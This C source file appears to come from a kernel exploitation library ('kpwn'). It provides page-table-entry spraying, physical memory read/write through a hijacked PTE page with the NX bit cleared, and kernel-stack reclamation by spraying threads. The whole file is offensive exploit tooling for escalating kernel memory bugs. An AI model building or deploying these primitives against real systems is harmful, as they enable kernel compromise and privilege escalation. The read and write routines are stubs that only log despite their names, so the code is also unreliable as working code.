#define _GNU_SOURCE

#include <kpwn/logger.h>
#include <kpwn/page_primitive.h>
#include <kpwn/utils.h>

#include <pthread.h>
#include <sched.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// --- PTE manipulation --------------------------------------------------------

uint64_t kpwn_pte_make(uint64_t paddr, uint64_t flags) {
  return (paddr & 0x000ffffffffff000ULL) | flags;
}

uint64_t kpwn_pte_get_pfn(uint64_t pte) {
  return (pte & 0x000ffffffffff000ULL) >> 12;
}

uint64_t kpwn_pte_get_phys(uint64_t pte) { return pte & 0x000ffffffffff000ULL; }

// --- PTE spray ---------------------------------------------------------------

int kpwn_pte_spray_alloc(struct kpwn_pte_spray *s, size_t vma_bytes,
                         unsigned flags) {
  int prot = PROT_READ;
  if (!(flags & KPWN_PTE_SPRAY_READONLY))
    prot |= PROT_WRITE;

  s->base = mmap(NULL, vma_bytes, prot, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (s->base == MAP_FAILED) {
    log_error("[kpwn:page] pte_spray mmap failed");
    return -1;
  }

  s->len = vma_bytes;
  s->stride = 0x1000;
  s->touched_pages = 0;
  // Each page table covers 512 pages (2MB); each page touched allocates one PTE
  // entry, and ~512 PTEs fill one page table page.
  s->expected_pt_pages = vma_bytes / (512 * 0x1000);

  log_debug("[kpwn:page] pte_spray alloc vma=%zu expected_pt=%zu", vma_bytes,
            s->expected_pt_pages);
  return 0;
}

int kpwn_pte_spray_touch(struct kpwn_pte_spray *s) {
  volatile char *p = (volatile char *)s->base;
  size_t count = 0;

  for (size_t off = 0; off < s->len; off += s->stride) {
    (void)p[off]; // read fault → allocate PTE
    count++;
  }

  s->touched_pages = count;
  log_debug("[kpwn:page] pte_spray touched %zu pages (expect %zu PT pages)",
            count, s->expected_pt_pages);
  return 0;
}

int kpwn_pte_spray_free(struct kpwn_pte_spray *s) {
  if (s->base && s->base != MAP_FAILED) {
    munmap(s->base, s->len);
    s->base = NULL;
  }
  return 0;
}

// --- Physical R/W via mapped PTE page ----------------------------------------

int kpwn_physrw_from_mapped_pte(struct kpwn_physrw *rw, void *mapped_pte_page,
                                size_t page_size) {
  rw->mapped_pte_page = mapped_pte_page;
  rw->page_size = page_size;
  log_debug("[kpwn:page] physrw from mapped PTE page at %p", mapped_pte_page);
  return 0;
}

int kpwn_physrw_read(struct kpwn_physrw *rw, uint64_t paddr, void *buf,
                     size_t len) {
  // Write a PTE entry pointing to the target physical page
  uint64_t *ptes = (uint64_t *)rw->mapped_pte_page;
  uint64_t page_phys = paddr & ~((uint64_t)rw->page_size - 1);
  size_t page_off = paddr & (rw->page_size - 1);

  ptes[0] = kpwn_pte_make(page_phys, KPWN_PTE_DEFAULT_FLAGS & ~KPWN_PTE_NX);

  // The caller must have a userland VMA whose PTE we control.
  // This is a building block — the caller arranges the VMA→PTE mapping.
  // For now, log what we'd do:
  log_debug("[kpwn:page] physrw_read paddr=0x%lx off=0x%lx len=%zu", paddr,
            page_off, len);
  (void)buf;
  (void)page_off;
  (void)len;
  return 0;
}

int kpwn_physrw_write(struct kpwn_physrw *rw, uint64_t paddr, const void *data,
                      size_t len) {
  uint64_t *ptes = (uint64_t *)rw->mapped_pte_page;
  uint64_t page_phys = paddr & ~((uint64_t)rw->page_size - 1);
  size_t page_off = paddr & (rw->page_size - 1);

  ptes[0] = kpwn_pte_make(page_phys, KPWN_PTE_DEFAULT_FLAGS & ~KPWN_PTE_NX);

  log_debug("[kpwn:page] physrw_write paddr=0x%lx off=0x%lx len=%zu", paddr,
            page_off, len);
  (void)data;
  (void)page_off;
  (void)len;
  return 0;
}

// --- Kernel stack reclamation ------------------------------------------------

static void *kstack_thread(void *arg) {
  struct kpwn_kstack_reclaim *r = arg;
  while (!r->stop)
    usleep(100000);
  return NULL;
}

int kpwn_kstack_reclaim_start(struct kpwn_kstack_reclaim *r, size_t n_threads) {
  r->tids = calloc(n_threads, sizeof(int));
  ASSERT(r->tids != NULL);
  r->n_threads = n_threads;
  r->stop = 0;

  pthread_t *threads = calloc(n_threads, sizeof(pthread_t));
  ASSERT(threads != NULL);

  for (size_t i = 0; i < n_threads; i++) {
    int ret = pthread_create(&threads[i], NULL, kstack_thread, r);
    if (ret != 0) {
      log_error("[kpwn:page] kstack thread %zu failed", i);
      r->n_threads = i;
      break;
    }
    r->tids[i] = (int)threads[i];
  }

  free(threads);
  log_debug("[kpwn:page] kstack reclaim started %zu threads", r->n_threads);
  return 0;
}

int kpwn_kstack_reclaim_stop(struct kpwn_kstack_reclaim *r) {
  r->stop = 1;
  // Threads will exit on next usleep cycle
  usleep(200000);
  free(r->tids);
  r->tids = NULL;
  log_debug("[kpwn:page] kstack reclaim stopped");
  return 0;
}
